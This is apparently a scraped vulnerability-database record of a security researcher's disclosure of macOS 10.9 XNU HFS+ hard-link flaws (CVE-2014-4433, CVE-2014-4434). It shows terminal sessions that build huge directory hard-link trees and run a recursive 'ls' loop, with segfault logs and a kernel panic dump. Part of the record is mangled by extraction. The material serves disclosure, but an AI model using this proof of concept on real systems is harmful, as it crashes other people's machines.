{
    "text": "vul_name : MacOSX 10.9/XNU HFS Kernel Multiple Vulnerabilities ， vul_cve : CVE-2014-4433 , CVE-2014-4434 ， vul_poc : MacOSX/XNU HFS Multiple Vulnerabilities ， Maksymilian Arciemowicz ， On November 8th , I've reported vulnerability in hard links for HFS+ ( CVE-2013-6799 )  ， The HFS+ file system does not apply strict privilege rules during the creating of hard links. The ability to create hard links to directories is wrong implemented and such an issue is affecting os versions greater or equal to 10.5.Officially Apple allows you to create hard links only for your time machine. <see wiki>Vulnerability CVE-2013-6799 ( incomplete fix for CVE-2010-0105 ) allow to create hard link to directory and the number of hard links may be freely high. To create N hard links , you must use a special algorithm which creates links from the top of the file system tree. This means that first we create the directory structure and once created we need to go from up to down by creating hard links. The last time I've mentioned of the possibility of a kernel crash by performing the 'ls' command. This situation occurs in conjunction with the 'find' application. ， Commands such as 'ls' behave in unexpected ways. Apple are going find this crash point in code. To create huge hard links structure , use this code ， h1XSS : tysiak cx $ uname -a ， Darwin 000000000000000.home 13.1.0 Darwin Kernel Version 13.1.0 : Thu Jan 16 19 : 40 : 37 PST 2014 ; root : xnu-2422.90.20 ~ 2/RELEASE_X86_64 x86_64 ， h1xss : tysiak cx $ gcc -o l2 l2.c ， h1xss : tysiak cx $ ./l2 1000 ， . ， h1xss : tysiak cx $ cat loop.sh ，  #  ! /bin/bash ， ls -laR B > /dev/null ， done ， h1xss : tysiak cx $ sh ./loop.sh ， ls : B : No such file or directory ， ls : X1 : No such file or directory ， . ， ls : X8 : Bad address ， ls : X1 : Bad address ， ls : X2 : Bad address ， . ， ls : X8 : No such file or directory ， ./loop.sh : line 4 : 8816 Segmentation fault : 11 ls -laR B > /dev/null ， ./loop.sh : line 4 : 8818 Segmentation fault : 11 ls -laR B > /dev/null ， ls : B : No such file or directory ， ls : X1 : No such file or directory ， ls : X2 : No such file or directory ， . ， ls : X1 : No such file or directory ， ls : X2 : No such file or directory ， . ， Feb 9 21 : 16 : 38 h1xss.home ReportCrash [ 9419 ]  : Saved crash report for ls [ 9418 ] version 230 to /Users/freak/Library/Logs/DiagnosticReports/ls_2014-02-09-211638_h1XSS.crash ， That what we can see here is unexpected behavior of LS command. LS process is also affected for infinite loop ( recursion? ) . ， h1xss : tysiak cx $ ps -fp 8822 ， UID PID PPID C STIME TTY TIME CMD ， 501 8822 8810 0 7 : 36 ttys002 62 : 19.65 ls -laR B ， or used parallely with ( find . > /dev/null ) command cause a kernel crash ， Mon Mar 31 20 : 30 : 41 2014 ， panic ( cpu 0 caller 0xffffff80044dbe2e )  : Kernel trap at 0xffffff8004768838 , type 13=general protection , registers :  ， CR0 : 0x0000000080010033 , CR2 : 0xffffff8122877004 , CR3 : 0x0000000001a5408c , CR4 : 0x00000000001606e0 ， RAX : 0xffffff802bc148a0 , RBX : 0xdeadbeefdeadbeef , RCX : 0x0000000000008000 , RDX : 0x0000000000000000 ， RSP : 0xffffff8140d9b990 , RBP : 0xffffff8140d9b9a0 , RSI : 0x0000000000000018 , RDI : 0xffffff802f23bcd0 ， R8 : 0xffffff8140d9bc1c , R9 : 0xffffff802f26e960 , R10 : 0xffffff8140d9ba2c , R11 : 0x0000000000000f92 ， R12 : 0xffffff801ba1a008 , R13 : 0xffffff8140d9bb20 , R14 : 0xffffff802f23bcd0 , R15 : 0xffffff802f26e960 ， RFL : 0x0000000000010282 , RIP : 0xffffff8004768838 , CS : 0x0000000000000008 , SS : 0x0000000000000010",
    "time": "2014-04-04 / 2014-10-18"
}